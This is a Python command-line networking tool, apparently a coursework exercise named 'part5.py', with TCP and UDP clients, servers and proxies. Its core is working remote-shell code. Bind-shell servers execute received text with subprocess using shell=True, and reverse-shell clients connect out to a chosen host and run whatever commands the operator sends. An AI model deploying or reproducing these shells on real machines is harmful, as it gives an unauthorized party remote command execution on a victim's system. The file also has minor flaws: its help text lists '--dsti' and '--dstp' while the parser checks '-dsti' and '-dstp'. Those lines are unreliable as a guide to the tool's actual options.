
## Import
import socket
import sys
import subprocess
import select

## global var
PACKET_SIZE = 65535

def TCP_client(addressToReach, port):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((addressToReach, port))

    
# wait to get all the server messages and print them
    while True:

        # get request from user and store it in request
        request = str(input(">>> "))

        if "quit" in request:
            break

        # send message to server
        print("sending request...")
    
        s.sendall(request.encode())

        # wait for response from server
        data = s.recv(PACKET_SIZE)
        print("<<< " + data.decode())

    # close the socket
    s.close()


    print('connection closed')
    return 

def UDP_client(addressToReach, port):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Connect to the server
    s.connect((addressToReach, port))

    while True:
        # get request from user
        request = input(str(">>> "))

        if "quit" == request:
            break
        
        # send message to server
        print("sending request...")
        s.sendall(request.encode())

        # wait for response from server
        data, _server_address = s.recvfrom(PACKET_SIZE)
        while data.decode() != "":
            print("<<<" + data.decode())
            data, _server_address = s.recvfrom(PACKET_SIZE)
            
    # close the socket
    s.close()

    print('connection closed')
    return


def TCP_server(address, port):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the port
    s.bind((address, port))

    # Listen for incoming connections
    s.listen(1)

    print('[*] Server is listening at {}:{}'.format(address, port))
    # wait for a connection
    while True:
        # accept connection
        connection, client_address = s.accept()
        print('[+] connection from {}'.format(client_address))

        # wait to get all the client messages and print them
        #
        while True:
            # wait for response from client
            data = connection.recv(PACKET_SIZE)
            if not data:
                break

            print('[*] received {!r} from {}'.format(data, client_address))

            # treat the request
            # ...
            message = 'Hello, client'
            print("sending... " + message)
            connection.sendall(message.encode())

            #Tell the transmission is finish
            

        # close the connection
        connection.close()
        print( 'connection closed')


def UDP_server(address, port):
     # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Bind the socket to the port
    s.bind((address, port))

    print('[*] Server is listening at {}:{} via udp'.format(address, port))
    # wait for a message from the client
    while True:
        data, client_address = s.recvfrom(PACKET_SIZE)
        print('[+] received {!r} from {}'.format(data, client_address))

        # treat the request
        # ...

        # send response to client
        message = 'your response'
        s.sendto(message.encode(), client_address)

        #send message to end the connection
        s.sendto("".encode(), client_address)



def shell_execute(command):

    # treat the request
    response = ""
    try:
        response = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, text=True)
    except subprocess.CalledProcessError as e:
        response = e.output
        print("error: " + e.output)

    if response == "":
        response = command

    return response


def TCP_shell_server(address, port):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the port
    s.bind((address, port))

    # Listen for incoming connections
    s.listen(1)

    print('[*] Server is listening at {}:{}'.format(address, port))
    # wait for a connection
    while True:
        # accept connection
        connection, client_address = s.accept()
        print('[+] connection from {}'.format(client_address))

        # wait to get all the client messages and print them
        #
        while True:
            # wait for response from client
            data = connection.recv(PACKET_SIZE)
            if not data:
                break

            print('[*] received {!r} from {}'.format(data, client_address))

            response = shell_execute(data.decode())
            print("sending... " + response)

            connection.sendall(response.encode())

            #Tell the transmission is finish
            

        # close the connection
        connection.close()
        print( 'connection closed')

def UDP_shell_server(address, port):
     # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Bind the socket to the port
    s.bind((address, port))

    print('[*] Server is listening at {}:{} via udp'.format(address, port))
    # wait for a message from the client
    while True:
        data, client_address = s.recvfrom(PACKET_SIZE)
        print('[+] received {!r} from {}'.format(data, client_address))

        # treat the request 
        response = shell_execute(data.decode())

        print("sending... " + response)
        # send response to client
        s.sendto(response.encode(), client_address)

        #send message to end the connection
        s.sendto("".encode(), client_address)



def TCP_reverse_shell_server(address, port):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the port
    s.bind((address, port))

    # Listen for incoming connections
    s.listen(1)

    print('[*] Server is listening at {}:{}'.format(address, port))
    # wait for a connection
    while True:
        # accept connection
        connection, client_address = s.accept()
        print('[+] connection from {}'.format(client_address))

        # wait to get all the client messages and print them
        #
        while True:
             # get request from user and store it in request
            request = input(">>> ")

            if "quit" in request:
                break

            print("sending... " + request)

            connection.sendall(request.encode())
            
            # wait for response from client
            data = connection.recv(PACKET_SIZE)

            print('<<< ' + data.decode())
            #Tell the transmission is finish
            
        # close the connection
        connection.close()
        print( 'connection closed')

def TCP_reverse_shell_client(address, port):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((address, port))

    while True:
        # wait for request from server
        data = s.recv(PACKET_SIZE)
        if not data:
            break

        cmd = data.decode()
        print('<<< ' + cmd)

        response = shell_execute(cmd)

        print("sending... " + response)

        s.sendall(response.encode())
    
    # close the socket
    s.close()


def UDP_reverse_shell_server(address, port):
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
        # Bind the socket to the port
        s.bind((address, port))
    
        print('[*] Server is listening at {}:{} via udp'.format(address, port))
        # wait for a message from the client
        while True:
            data, client_address = s.recvfrom(PACKET_SIZE)
            print('[+] received {!r} from {}'.format(data, client_address))
    
            while True:
                # get request from user and store it in request
                request = input(">>> ")
    
                if "quit" in request:
                    break
    
                print("sending... " + request)
    
                s.sendto(request.encode(), client_address)
                
                # wait for response from client
                data, client_address = s.recvfrom(PACKET_SIZE)
    
                print('<<< ' + data.decode())
            
            break
        # close the socket
        s.close()

def UDP_reverse_shell_client(address, port):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Connect to the server
    s.connect((address, port))

    s.sendto("connection..;".encode(), (address, port))
    while True:
        # wait for request from server
        data = s.recv(1024)
        if not data:
            break
        print('<<< ' + data.decode())

        response = shell_execute(data.decode())

        print("sending... " + response)

        s.sendall(response.encode())
    
    # close the socket
    s.close()



"""
>>> thanks to rsc-dev for the help
>>> on the proxy server
"""
def TCP_proxy_server(address_src, port_src, address_dst, port_dst):

    # setup connection port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((address_src, port_src))
    s.listen(1)

    print('[*] proxy is listening at {}:{}'.format(address_src, port_src))
    s_src, s_addr = s.accept()

    print('[+] connection from {}'.format(s_addr))

    # connect to the destination
    s_dst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_dst.connect((address_dst, port_dst))

    print('[*] proxy is connected to {}:{}'.format(address_dst, port_dst))
    while True:
        s_read, _, _ = select.select([s_src, s_dst], [], [])
        
        for sock in s_read:
            data = None
            while not data:
                data = sock.recv(PACKET_SIZE)

            if sock == s_src:
                print("received from src : " + data.decode())
                s_dst.sendall(data)

            else:
                print("received from dst : " + data.decode())
                s_src.sendall(data)

            data = None


def UDP_proxy_server(address_src, port_src, address_dst, port_dst):
    
    # setup connection port
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((address_src, port_src))
    
    print('[*] proxy is listening at {}:{}'.format(address_src, port_src))
    
    client_address = None
    server_address = (address_dst, port_dst)
    
    while True:
        data, addr = s.recvfrom(PACKET_SIZE)

        if client_address is None:
            client_address = addr
            print('[+] connection from {}'.format(client_address))
        
        if addr == client_address:
            print("received from src : " + data.decode())
            s.sendto(data, server_address)
            
        elif addr == server_address:
            print("received from dst : " + data.decode())
            s.sendto(data, client_address)
        
        else:
            print("received from unknown address : " + data.decode())


def printHelp():
    print("python part5.py <options>")
    print("options:")
    print("\t-h (help)\n")
    print("obligatory for all:")
    print("\t-t <type of connection> (tcp or udp)")
    print("\t-p <port>\n")
    print("obligatory for server:")
    print("\t--server")
    print("optional:")
    print("\t--reverse-shell")
    print("\t-i <ip address>")
    print("\n\nobligatory for client:")
    print("\t--client")
    print("optional:")
    print("\t-i <ip address>")
    print("\t--reverse-shell")
    print("\n\nmandatory for shell server:")
    print("\t--shell")
    print("optional:")
    print("\t-i <ip address>")
    print("\n\nmandatory for proxy server:")
    print("\t--proxy")
    print("\t--dsti <destination ip>")
    print("\t--dstp <destination port>")
    print("optional:")
    print("\t-i <ip address>")





def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

if __name__ == '__main__':
    # check arguments
    if len(sys.argv) < 2:
        print("missing arguments")
        printHelp()
        sys.exit(1)

    isServer = False
    isClient = False
    shell = False
    reverseShell = False
    proxy = False
    dsti = ""
    dstp = ""
    address = "localhost"
    for index, value in enumerate(sys.argv):
        if value == "-t":
            typeOfConnection = sys.argv[index + 1]
        elif value == "-i":
            addressToReach = sys.argv[index + 1]
            address = addressToReach
        elif value == "-p":
            port = int(sys.argv[index + 1])
        elif value == "--server":
            isServer = True
        elif value == "--client":
            isClient = True
        elif value == "-h":
            printHelp()
            sys.exit(0)
        elif value == "--shell":
            shell = True
        elif value == "--reverse-shell":
            reverseShell = True
        elif value == "--proxy":
            proxy = True
        elif value == "-dsti":
            dsti = sys.argv[index + 1]
        elif value == "-dstp":
            dstp = int(sys.argv[index + 1])


    # check if all obligatory arguments are present:
    if not "typeOfConnection" in locals() or not "port" in locals():
        print("missing obligatory arguments")
        printHelp()
        sys.exit(1)

    if reverseShell and proxy:
        print("cannot be proxy and reverse shell at the same time")
        printHelp()
        sys.exit(1)

    if proxy:
        if dsti == "" or dstp == "":
            print("missing obligatory arguments dsti or dstp for proxy")
            printHelp()
            sys.exit(1)

        if typeOfConnection == "tcp":
            TCP_proxy_server(address, port, dsti, dstp)
        elif typeOfConnection == "udp":
            UDP_proxy_server(address, port, dsti, dstp)
        else:
            print("unknown type of connection")
            sys.exit(1)
            
        
    if reverseShell:
        if isServer:
            print(get_local_ip())
            if typeOfConnection == "tcp":
                TCP_reverse_shell_server(address, port)
            elif typeOfConnection == "udp":
                UDP_reverse_shell_server(address, port)
            else:
                print("unknown type of connection")
                sys.exit(1)

        elif isClient:
            if typeOfConnection == "tcp":
                TCP_reverse_shell_client(addressToReach, port)
            elif typeOfConnection == "udp":
                UDP_reverse_shell_client(addressToReach, port)
            else:
                print("unknown type of connection")
                sys.exit(1)
        else:
            print("missing obligatory arguments")
            printHelp()
            sys.exit(1)

    
    if sum([isServer, isClient, shell]) != 1:
        print("missing obligatory arguments")
        printHelp()
        sys.exit(1)    

    if isServer:
        print(get_local_ip())
        if typeOfConnection == "tcp":
            TCP_server(address, port)
        elif typeOfConnection == "udp":
            UDP_server(address, port)
        else:
            print("unknown type of connection")
            sys.exit(1)

    elif isClient:
        if typeOfConnection == "tcp":
            TCP_client(addressToReach, port)
        elif typeOfConnection == "udp":
            UDP_client(addressToReach, port)
        else:
            print("unknown type of connection")
            sys.exit(1)
    
    elif shell:
        if typeOfConnection == "tcp":
            TCP_shell_server(address, port)
        elif typeOfConnection == "udp":
            UDP_shell_server(address, port)
        else:
            print("unknown type of connection")
            sys.exit(1)
    

